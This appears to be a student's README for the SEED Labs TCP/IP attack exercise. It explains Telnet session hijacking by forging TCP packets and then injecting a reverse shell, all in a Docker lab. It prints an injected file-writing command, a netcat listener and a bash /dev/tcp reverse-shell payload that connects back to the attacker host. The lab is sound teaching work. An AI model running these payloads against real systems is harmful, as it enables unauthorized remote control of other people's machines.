# 🌐 TCP/IP Attack Lab – Session Hijacking & Reverse Shell

## 📌 Overview

This project demonstrates practical **TCP/IP network attacks** focusing on **TCP Session Hijacking** and **Reverse Shell exploitation**.

The lab shows how attackers can exploit weaknesses in TCP and insecure protocols like **Telnet** to inject commands or gain full control of a remote machine.

The experiment is divided into two major tasks:

* **Task 3 – TCP Session Hijacking**
* **Task 4 – Reverse Shell via TCP Injection**

The lab was conducted using the **SEED Security Labs TCP Attack environment with Docker containers**. 

---

# 🎯 Learning Objectives

* Understand how **TCP sessions work**
* Learn how **sequence numbers control TCP communication**
* Capture network traffic using **Wireshark**
* Perform **TCP Session Hijacking**
* Inject commands into an existing Telnet connection
* Create a **Reverse Shell for persistent access**
* Analyze weaknesses in **unencrypted protocols like Telnet**

---

# 🧪 Lab Environment

The experiment uses the **SEED Security Labs networking environment**.

### Setup Steps

1. Download the lab setup files.
2. Extract the `Labsetup.zip` archive.
3. Rename the folder to your student name.
4. Run the Docker environment.

```bash id="cmd1"
docker-compose build
docker-compose up
```

This command launches the containers used in the attack simulation. 

---

# 🖥 Lab Network Architecture

The experiment contains four main containers:

| Machine        | Role                              |
| -------------- | --------------------------------- |
| Attacker       | Launches the TCP hijacking attack |
| Victim         | Target server                     |
| Host B (User1) | Legitimate Telnet client          |
| Host C (User2) | Additional network host           |

---

# ⚔️ Task 3 — TCP Session Hijacking

## Objective

Hijack an active **Telnet session** between:

```id="id1"
Host B (10.9.0.6)
```

and

```id="id2"
Victim Server (10.9.0.5)
```

and inject a malicious command into the session.

The injected command creates a file:

```id="id3"
hacked.txt
```

with the message:

```id="id4"
you are hacked
```

on the victim machine. 

---

## Attack Principle

TCP does **not authenticate packet sources**.

If an attacker sends a packet with:

* Correct **source IP**
* Correct **port numbers**
* Correct **sequence number**
* Correct **ACK number**

the server accepts it as part of the legitimate session.

---

## Attack Steps

### 1️⃣ Establish Telnet Connection

Host B connects to the victim server using Telnet:

```bash id="cmd2"
telnet 10.9.0.5
```

---

### 2️⃣ Capture Network Traffic

Wireshark is used to capture packets on the network interface.

Filter applied:

```id="id5"
tcp.port == 23 && ip.addr == 10.9.0.6
```

This shows only Telnet traffic.

---

### 3️⃣ Extract TCP Session Values

From Wireshark the following values are collected:

* Source IP
* Destination IP
* Source Port
* Destination Port
* Sequence Number
* Acknowledgment Number

These values allow the attacker to **forge a valid TCP packet**.

---

### 4️⃣ Create the Attack Script

A Python script was written to craft the malicious packet.

Example attack payload:

```id="id6"
echo "you are hacked" > ~/hacked.txt
```

The packet is constructed with:

* Spoofed IP header
* Valid TCP header
* Malicious payload

---

### 5️⃣ Execute the Attack

The attack script sends the forged packet to the victim server.

The Telnet server executes the injected command because it believes the packet came from Host B.

---

## Result

A file appears on the victim machine:

```id="id7"
/home/seed/hacked.txt
```

File content:

```id="id8"
you are hacked
```

This proves that the **TCP session was successfully hijacked**.

---

# 🐚 Task 4 — Reverse Shell via TCP Injection

## Objective

Extend the previous attack to gain **interactive remote access** to the victim machine.

Instead of injecting a single command, a **reverse shell command** is injected.

This gives the attacker **full shell access**.

---

## Reverse Shell Concept

A reverse shell works by forcing the victim machine to connect back to the attacker.

This bypasses many firewall restrictions because **outgoing connections are usually allowed**.

---

## Attack Steps

### 1️⃣ Start Netcat Listener

On the attacker machine:

```bash id="cmd3"
nc -lvn 9090
```

This waits for incoming connections.

---

### 2️⃣ Capture Telnet Traffic

Wireshark captures the active Telnet session again to obtain the latest TCP values.

---

### 3️⃣ Create Reverse Shell Script

A Python script crafts a forged TCP packet with the payload:

```id="id9"
/bin/bash -i > /dev/tcp/10.9.0.1/9090 0<&1 2>&1
```

This command redirects the victim's shell to the attacker.

---

### 4️⃣ Execute the Attack

The spoofed packet is sent to the victim server.

The injected command forces the victim machine to open a connection to the attacker.

---

### 5️⃣ Gain Interactive Shell

The attacker’s Netcat terminal receives the connection and provides a shell prompt.

Example command execution:

```bash id="cmd4"
hostname
```

Output confirms control of the victim machine.

---

# 📊 Attack Analysis

The attacks succeeded because:

* **TCP has no built-in authentication**
* **Sequence numbers are visible on the network**
* **Telnet sends data in plain text**
* The attacker was on the **same network segment**

Once the correct sequence numbers were captured, the attacker could inject packets accepted as legitimate traffic. 

---

# ⚠️ Security Lessons

This experiment demonstrates why insecure protocols are dangerous.

Major weaknesses exploited:

* Lack of TCP authentication
* Plain-text Telnet traffic
* Predictable sequence numbers
* Unencrypted sessions

Modern systems should use:

* **SSH instead of Telnet**
* Encrypted communication protocols
* Network monitoring tools
* Intrusion detection systems (IDS)

---

# 📂 Project Structure

```id="id10"
TCP-IP-Attack-Lab
│
├── task3_hijack.py
├── task4_reverse.py
├── Asfour_1210737_TODO4
└── README.md
```

---

# 👩‍💻 Author

**Saja Asfour**

---

# 📚 References

* SEED Security Labs – TCP/IP Attack Lab
* Wireshark Documentation
* TCP/IP Networking Fundamentals
* Linux Networking Tools
